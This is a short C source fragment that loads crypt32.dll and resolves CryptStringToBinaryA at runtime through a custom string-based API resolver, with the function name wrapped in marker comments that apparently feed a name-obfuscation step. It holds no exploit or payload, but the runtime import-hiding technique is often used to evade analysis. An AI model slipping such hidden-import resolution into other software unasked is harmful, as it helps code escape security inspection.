
HANDLE _CRYPT32 = 0;

BOOL (WINAPI *_CryptStringToBinaryA)( LPCTSTR pszString, DWORD cchString, DWORD dwFlags, BYTE* pbBinary, DWORD* pcbBinary, DWORD* pdwSkip, DWORD* pdwFlags );

void* padrCrypt32[] = 
{ 
	&_CryptStringToBinaryA 
};


char crypt32HandleStr[] = "crypt32.dll";

char crypt32Str[] = "/*@S|*/00CryptStringToBinaryA/*@E*/|";


void InitCrypt32()
{
	_CRYPT32 = _GetModuleHandle(crypt32HandleStr); 
	if (_CRYPT32 == NULL) 
		_CRYPT32 = _LoadLibrary(crypt32HandleStr);

	InitAPIbyStr(padrCrypt32, _CRYPT32, crypt32Str);
}

